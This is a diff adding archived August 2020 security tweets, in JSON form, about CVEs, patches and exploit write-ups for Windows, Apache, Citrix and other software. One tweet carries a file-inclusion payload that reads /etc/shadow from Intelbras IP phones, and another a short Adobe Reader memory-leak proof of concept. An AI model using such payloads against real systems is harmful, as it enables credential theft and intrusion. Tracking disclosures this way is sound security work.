+    "tweettext": "CVE-2020-1571 Windows Setup Elevation of Privileges Bypass 0day  https://t.co/cYoe2PnKZT  #Pentesting #Windows #Vulnerability #CVE #Infosec https://t.co/3H38QKJWA0",
+    "tweettime": "2020-08-15, 16:40:21",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1294675304871534592",
+    "username": "ptracesecurity"
+}
+{
+    "expanded_url": [
+        "https://cwiki.apache.org/confluence/display/WW/S2-059"
+    ],
+    "tweetfavorites": 237,
+    "tweetquotes": 5,
+    "tweetreplies": 4,
+    "tweetretweets": 102,
+    "tweettext": "Apache Struts RCE: S2-059 / CVE-2019-0230\n\nhttps://t.co/m6z3jqRsj4\n\nForced double OGNL evaluation, when evaluated on raw user input in tag attributes, may lead to remote code execution. https://t.co/6JwZCozTeB",
+    "tweettime": "2020-08-13, 17:41:35",
+    "tweeturl": "https://twitter.com/chybeta/status/1293965938388119553",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz"
+    ],
+    "tweetfavorites": 114,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 46,
+    "tweettext": "CVE-2020-9496 Apache OFBiz PRE-AUTH RCE \n\nadvisory: https://t.co/rsmAgGmzoa https://t.co/ChaSFoeXO8",
+    "tweettime": "2020-08-13, 10:15:02",
+    "tweeturl": "https://twitter.com/chybeta/status/1293853562489810946",
+    "username": "chybeta"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 117,
+    "tweettext": "RT @TheHackersNews: Here are technical details for a new Windows Remote Access elevation of privilege #vulnerability (CVE-2020-1530) for wh…",
+    "tweettime": "2020-08-12, 19:35:42",
+    "tweeturl": "https://twitter.com/jedisct1/status/1293632271749087232",
+    "username": "jedisct1"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2020/08/microsoft-software-patches.html"
+    ],
+    "tweetfavorites": 34,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 25,
+    "tweettext": "One of the zero-day vulnerabilities under active attack is a remote code execution bug (CVE-2020-1380) affecting Internet Explorer.\n\nhttps://t.co/JaFIg6obtV\n\nSpotted by @kaspersky experts, unknown threat actors are exploiting this issue as part of 'Operation PowerFall' attacks. https://t.co/ctEVtIdYfI",
+    "tweettime": "2020-08-12, 18:54:56",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1293622012133310464",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://symeonp.github.io/2020/12/08/phonebook-uaf-analysis.html",
+        "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1530"
+    ],
+    "tweetfavorites": 197,
+    "tweetquotes": 5,
+    "tweetreplies": 1,
+    "tweetretweets": 117,
+    "tweettext": "Here are technical details for a new Windows Remote Access elevation of privilege #vulnerability (CVE-2020-1530) for which #Microsoft released a security patch yesterday.\n\nhttps://t.co/QaL3a1DbzC\n\nAdvisory: https://t.co/Nsc5X1cc5m\n\n#PatchTuesday https://t.co/QTQajyZluF",
+    "tweettime": "2020-08-12, 18:03:46",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1293609136605675520",
+    "username": "TheHackersNews"
+}
+{
+    "tweetfavorites": 224,
+    "tweetquotes": 6,
+    "tweetreplies": 1,
+    "tweetretweets": 87,
+    "tweettext": "CVE-2020-9697: Info disclosure in #Adobe Reader. \n\nPoC: \nvar a = app.measureDialog(app);\nconsole.println(\"Escript Base: \" + (Math.abs(a[1]) - 0x0044b43).toString(16)) https://t.co/dpxYcvLnca",
+    "tweettime": "2020-08-12, 15:22:53",
+    "tweeturl": "https://twitter.com/thezdi/status/1293568647043190784",
+    "username": "thezdi"
+}
+{
+    "expanded_url": [
+        "https://support.citrix.com/article/CTX277457"
+    ],
+    "tweetfavorites": 136,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 78,
+    "tweettext": "The advisory for an Unauthenticated Arbitrary File Read vulnerability in Citrix XenMobile (CVE-2020-8209) found by our researcher Andrey Medov is now out! The fixes were released privately 3 weeks ago, so we hope a lot of companies are protected now 🙂 https://t.co/iWT0CBneTu https://t.co/NpIyV6gzga",
+    "tweettime": "2020-08-12, 14:07:00",
+    "tweeturl": "https://twitter.com/ptswarm/status/1293549550066642946",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://symeonp.github.io/2020/12/08/phonebook-uaf-analysis.html"
+    ],
+    "tweetfavorites": 341,
+    "tweetquotes": 4,
+    "tweetreplies": 6,
+    "tweetretweets": 153,
+    "tweettext": "Yesterday's Patch Tuesday included a PhoneBook use-after-free vulnerability (CVE-2020-1530) I reported. I decided to do a step-by-step write up on how I discovered it. It covers some basic sample gathering, harnessing, fuzzing, analysis and exploitation https://t.co/Uvyvy8CqX1",
+    "tweettime": "2020-08-12, 12:56:28",
+    "tweeturl": "https://twitter.com/symeonp/status/1293531800325754891",
+    "username": "symeonp"
+}
+{
+    "expanded_url": [
+        "https://www.redtimmy.com/java-hacking/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/"
+    ],
+    "tweetfavorites": 89,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 58,
+    "tweettext": "Apache Tomcat RCE by deserialization (CVE-2020-9484) – write-up and exploit  https://t.co/PRJBBTvpRL  #Apache #Java #RCE #Explot #CyberSecurity #Infosec https://t.co/eIK7DCWHAe",
+    "tweettime": "2020-08-12, 04:47:51",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1293408837060501505",
+    "username": "ptracesecurity"
+}
+{
+    "expanded_url": [
+        "https://go.usa.gov/xfArr"
+    ],
+    "tweetfavorites": 94,
+    "tweetquotes": 11,
+    "tweetreplies": 0,
+    "tweetretweets": 113,
+    "tweettext": "Microsoft’s #PatchTuesday updates include patches for two vulnerabilities—CVE-2020-1380 and CVE-2020-1464—being actively exploited. Update ASAP to protect your systems. https://t.co/FEPH4f2y7S #Cyber #Cybersecurity #InfoSec",
+    "tweettime": "2020-08-11, 19:06:37",
+    "tweeturl": "https://twitter.com/USCERT_gov/status/1293262564529508352",
+    "username": "USCERT_gov"
+}
+{
+    "expanded_url": [
+        "https://bit.ly/33Qh3go"
+    ],
+    "tweetfavorites": 118,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 68,
+    "tweettext": "Windows Print Spooler Patch Bypass Re-Enables Persistent Backdoor. @HexKitchen details how the patch for CVE-2020-1048 was easily bypassed and looks at the new patch released today to fix it. https://t.co/ayeIQC0CQV",
+    "tweettime": "2020-08-11, 18:14:56",
+    "tweeturl": "https://twitter.com/thezdi/status/1293249558768746496",
+    "username": "thezdi"
+}
+{
+    "expanded_url": [
+        "https://github.com/math1as/CVE-2020-1337-exploit"
+    ],
+    "tweetfavorites": 224,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 99,
+    "tweettext": "Oh it's patch tuesday.\nI'm happy to release the exploit of CVE-2020-1337 , this year's leet CVE-ID. also known as windows print spooler privilege escalation bug.\nthanks @md5_salt for the great idea.\nhttps://t.co/GxtUqoSMQM",
+    "tweettime": "2020-08-11, 17:18:16",
+    "tweeturl": "https://twitter.com/Ma7h1as/status/1293235295337381889",
+    "username": "Ma7h1as"
+}
+{
+    "expanded_url": [
+        "https://www.redtimmy.com/java-hacking/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/"
+    ],
+    "tweetfavorites": 67,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 23,
+    "tweettext": "Apache Tomcat RCE by deserialization (CVE-2020-9484) – write-up and exploit\n\nhttps://t.co/lmFgh6v6Gu",
+    "tweettime": "2020-08-11, 15:35:30",
+    "tweeturl": "https://twitter.com/FlatL1ne/status/1293209434345426945",
+    "username": "FlatL1ne"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2020/08/vBulletin-vulnerability-exploit.html"
+    ],
+    "tweetfavorites": 68,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 54,
+    "tweettext": "🔥 Watch Out! A new critical #vBulletin zero-day RCE #vulnerability and its PoC exploits have been publicly disclosed, allowing attackers to bypass patch for an old RCE bug (CVE-2019-16759) and remotely compromise sites.\n\nDetails — https://t.co/961xiq1BqC\n\n#infosec #cybersecurity",
+    "tweettime": "2020-08-11, 13:48:53",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1293182603751694336",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://honoki.net/2020/08/10/cve-2020-11518-how-i-bruteforced-my-way-into-your-active-directory/"
+    ],
+    "tweetfavorites": 1061,
+    "tweetquotes": 17,
+    "tweetreplies": 24,
+    "tweetretweets": 423,
+    "tweettext": "I'm celebrating my first CVE with a writeup! Hope you enjoy it.  🤓\n\n\"CVE-2020-11518: how I bruteforced my way into your Active Directory\"\n\nhttps://t.co/aHKeF7Q3lE\n\n#bugbounty #writeup #blogpost #blog https://t.co/aiweywp3ne",
+    "tweettime": "2020-08-10, 18:04:07",
+    "tweeturl": "https://twitter.com/honoki/status/1292884449110249474",
+    "username": "honoki"
+}
+{
+    "expanded_url": [
+        "https://www.bleepingcomputer.com/news/security/fbi-iranian-hackers-trying-to-exploit-critical-f5-big-ip-flaw/"
+    ],
+    "tweetfavorites": 95,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 49,
+    "tweettext": "The FBI warns of Iranian hackers actively attempting to exploit vulnerable F5 Big-IP ADC devices unpatched against the CVE-2020-5902 unauthenticated remote code execution flaw - @serghei\nhttps://t.co/rcwTyZnqE6",
+    "tweettime": "2020-08-08, 09:00:12",
+    "tweeturl": "https://twitter.com/BleepinComputer/status/1292022789059248128",
+    "username": "BleepinComputer"
+}
+{
+    "expanded_url": [
+        "https://github.com/lucxssouza/CVE-2020-13886"
+    ],
+    "tweetfavorites": 97,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 40,
+    "tweettext": "CVE-2020-13886 0day INTELBRAS TELEFONE IP TIP200/200 LITE &amp; TIP 300 - Local File Include\n\n[ Proof Of Concept ]\nURL parameter -&gt;http://HOST/cgi-bin/cgiServer.exx?page=\n\nLFI payload -&gt; ../../../../etc/shadow\n\nhttps://t.co/fQEOI2WZsF https://t.co/ixlAj26tAM",
+    "tweettime": "2020-08-06, 01:28:21",
+    "tweeturl": "https://twitter.com/wugeej/status/1291184302672158720",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "https://behindthebreach.com/l/46"
+    ],
+    "tweetfavorites": 119,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 64,
+    "tweettext": "Apache Tomcat RCE by deserialization (CVE-2020-9484) - write-up and exploit https://t.co/YygbwhoXTd #vulnerability #collection #execution #cve_2020_9484 #apache #tomcat",
+    "tweettime": "2020-08-05, 04:00:07",
+    "tweeturl": "https://twitter.com/behindthebreach/status/1290860109053284353",
+    "username": "behindthebreach"
+}
+{
+    "tweetfavorites": 105,
+    "tweetquotes": 1,
+    "tweetreplies": 3,
+    "tweetretweets": 29,
+    "tweettext": "I have just finished the recent IBM Websphere RCE PoC (CVE-2020-4450). It's a nice chain and after all I have learnt many things! https://t.co/JWRiiy7MEM",
+    "tweettime": "2020-08-04, 16:34:24",
+    "tweeturl": "https://twitter.com/peterjson/status/1290687541188767745",
+    "username": "peterjson"
+}
+{
+    "expanded_url": [
+        "https://swarm.ptsecurity.com/openfire-admin-console/"
+    ],
+    "tweetfavorites": 254,
+    "tweetquotes": 4,
+    "tweetreplies": 3,
+    "tweetretweets": 112,
+    "tweettext": "OpenFire allows to get Arbitrary File Read and Unauthenticated Full Read SSRF via its 9090/http and 9091/https ports. The details are in the article by Alexandr Shvetsov (CVE-2019-18393 &amp; CVE-2019-18394): https://t.co/8LTBkwxQaL https://t.co/gpUx8Bos9i",
+    "tweettime": "2020-08-04, 14:46:04",
+    "tweeturl": "https://twitter.com/ptswarm/status/1290660280372994054",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://blog.vincss.net/2020/06/cve49-microsoft-windows-lnk-remote-code-execution-vuln-cve-2020-1299-eng.html"
+    ],
+    "tweetfavorites": 68,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 37,
+    "tweettext": "[CVE49] Microsoft Windows LNK Remote Code Execution Vulnerability - CVE-2020-1299  https://t.co/R1oLe81oUw  #Windows #Vulnerability #RCE #CVE #LNK #Infosec https://t.co/DTeuz9GZip",
+    "tweettime": "2020-08-01, 23:32:06",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1289705496266641408",
+    "username": "ptracesecurity"
+}
